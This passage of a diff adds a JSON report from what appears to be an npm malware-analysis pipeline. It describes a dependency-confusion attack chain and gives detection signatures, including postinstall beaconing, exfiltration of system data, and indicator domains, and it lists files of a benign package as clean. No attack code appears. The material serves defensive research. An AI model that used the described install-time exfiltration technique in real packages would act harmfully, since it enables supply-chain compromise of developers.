+                    "implemented_by": [],
+                    "leads_to": "Execution of postinstall or import-time code embedded in the malicious package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation or import, performing network beaconing or exfiltrating system information to external servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives confirmation of internal package usage or detailed system data"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses the received confirmation or exfiltrated data for internal reconnaissance or as proof-of-concept for supply chain compromise.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Final goal: enable further targeted attacks or demonstrate internal exposure"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited network requests to external domains during package installation (postinstall) or import",
+                    "Collection and exfiltration of system environment data (CPU, home directory, hostname, username, DNS servers) at import-time",
+                    "Use of package name in remote URLs as part of network beaconing (dependency confusion indicator)",
+                    "Presence of code in entry points that references os, dns, or process environment modules"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js or index.js in package root containing network request code",
+                    "References to external domains such as *.lupin.com or *.oast.pro in package source files",
+                    "Use of os, dns, or process environment modules in package entry points",
+                    "Presence of postinstall scripts or code in package.json or main entry files"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to domains matching *.lupin.com during installation",
+                    "HTTPS POST requests to domains matching *.oast.pro containing serialized system metadata",
+                    "Outbound connections to non-standard or attacker-controlled domains at install or import time"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests to external or non-standard domains during installation (postinstall) or import. Use static analysis to flag packages whose entry points (e.g., app.js, index.js) reference os, dns, or process environment modules and contain code for network exfiltration. Block or alert on packages with postinstall scripts or code that contacts external servers using the package name. Inspect network logs for HTTP/HTTPS requests to domains such as *.lupin.com and *.oast.pro, especially if requests contain serialized system or environment data."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/Shoulder.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/cli.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/debug.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/outputters/json.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/outputters/list.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/outputters/nbsp.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/package-check.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
